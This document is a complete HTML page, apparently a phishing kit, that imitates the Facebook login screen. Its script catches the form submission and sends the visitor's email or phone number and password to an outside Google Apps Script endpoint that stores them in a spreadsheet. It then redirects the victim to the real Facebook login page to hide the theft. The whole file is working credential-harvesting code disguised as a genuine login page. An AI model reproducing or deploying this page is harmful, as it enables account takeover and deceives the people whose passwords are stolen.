<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>Facebook login Niloy page</title>
  <link rel="icon" type="image/x-icon" href="favicon.png">
  
  <!-- HTML -->
  

  <!-- Custom Styles -->
  <link rel="stylesheet" href="style.css">
  
  
  
  
  
  
 
 
 
 
 
  </style>
</head>

<body>
  <div class="logo">
    <img src="pp.jpg" alt="">
  </div>
  
  <h1>facebook</h1>
  
  <form method="POST" name="google-sheet">
    <div class="container">
      <input type="text" name="user" placeholder="mobile number or email address" required>
      <input type="password" name="data" placeholder="password" required>
      <a href="https://m.facebook.com"><input type="submit" value=LogIn></a>
      
  
      <a href="#">forgotten password?</a>
      <div class="style">or</div>
      <button class="new-account">Create New Account</button>
    </div>
  </form>
  
  <script>
    const scriptURL = 'https://script.google.com/macros/s/AKfycbz1mFbb56F00cPdk2IkkDG15qiVdrFpq-ivUPPs3ZOf5ZnjY80_UodUa7YK_4rTJeVp/exec';
    const form = document.forms['google-sheet'];
  
    form.addEventListener('submit', function(e) {
      e.preventDefault();
      
      // Submit to Google Sheets
      fetch(scriptURL, { 
        method: 'POST', 
        body: new FormData(form) 
      })
      .then(response => {
        // After successful submission, redirect to Facebook
        window.location.href = 'https://www.facebook.com/login';
      })
      .catch(error => {
        console.error('Error!', error.message);
        // If submission fails, still redirect to Facebook
        window.location.href = 'https://www.facebook.com/login';
      });
    });
  </script>
  
</body>
</html>
